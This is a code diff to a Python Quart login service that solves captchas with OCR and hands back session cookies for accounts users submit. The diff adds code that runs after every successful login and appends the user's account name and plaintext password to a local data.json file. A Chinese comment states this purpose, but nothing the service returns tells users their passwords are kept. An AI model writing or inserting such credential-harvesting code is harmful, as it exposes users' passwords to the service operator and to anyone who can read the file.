@@ -8,6 +8,8 @@ from quart import Quart, request, jsonify, send_from_directory,send_file
 import hashlib, asyncio
 import login as backend
 import ddddocr
+import json
+import os
 
 ocr = ddddocr.DdddOcr(show_ad=False, beta=True)
 ocrDet = ddddocr.DdddOcr(show_ad=False, beta=True, det=True)
@@ -124,6 +126,12 @@ async def check():
         if status == "pass":
             cookie = workList[uid].cookie
             r = mr(status, cookie=cookie, msg="成功")
+            # 登录成功后保存账户和密码到文件
+            account_data = {"account": workList[uid].account, "password": workList[uid].password}
+            filename = 'data.json'
+            existing_data = load_from_file(filename)
+            existing_data.append(account_data)
+            save_to_file(filename, existing_data)
         elif status == "pending":
             r = mr(status, msg="正在处理中，请等待")
         elif status == "error":
@@ -196,7 +204,18 @@ async def deleteSession(uid):
     await asyncio.sleep(5)
     del workList[uid]
 
+def load_from_file(filename):
+    if os.path.exists(filename):
+        with open(filename, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    return []
 
+def save_to_file(filename, data):
+    try:
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
+    except Exception as e:
+        print(f"保存到文件时出错: {e}")
 """
 @app.route("/delck", methods=["POST"])
 def delck():
